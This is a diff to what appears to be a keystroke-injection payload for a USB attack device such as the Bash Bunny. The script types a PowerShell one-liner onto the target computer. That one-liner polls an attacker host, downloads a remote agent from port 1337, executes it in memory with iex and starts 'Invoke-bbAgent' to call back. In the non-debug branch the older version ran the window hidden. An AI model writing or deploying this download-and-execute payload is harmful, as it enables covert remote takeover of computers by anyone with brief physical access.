@@ -20,6 +20,7 @@
 #### INITIALIZE STAGE ####
 LED SETUP
 GET SWITCH_POSITION
+export SERVERIP="172.16.64.1"
 # Enable debug
 export DEBUG=true
 # export DEBUG=false
@@ -43,14 +44,15 @@ Q ENTER
 if [ $DEBUG ]; then
     ### Old Powershell command
     # Q STRING "powershell -NonI -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337 -verbose\""
-    Q STRING "powershell -NonI -NoP -C \"\$p='192.168.1.136';\$ic=1;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');Invoke-bbAgent \$p 1337 -verbose;exit}catch{\$ic++}}else{\$ic++}sleep -s 2}\""
+    Q STRING "powershell -NonI -Nop -C \"\$p='192.168.1.136';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337 -verbose;exit}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 else
     ### Old Powershell command
     # Q STRING "powershell -NonI -W Hidden -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337\""
-    Q STRING "powershell -NonI -W Hidden -NoP -C \"\$p='192.168.1.136';\$ic=1;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');Invoke-bbAgent \$p 1337;exit}catch{\$ic++}}else{\$ic++}sleep -s 2}\""
+    Q STRING "powershell -NonI -Nop -C \"\$p='192.168.1.136';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337;exit}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 fi
+Q DELAY 1000
 
 #### ETHERNET STAGE ####
 ATTACKMODE RNDIS_ETHERNET
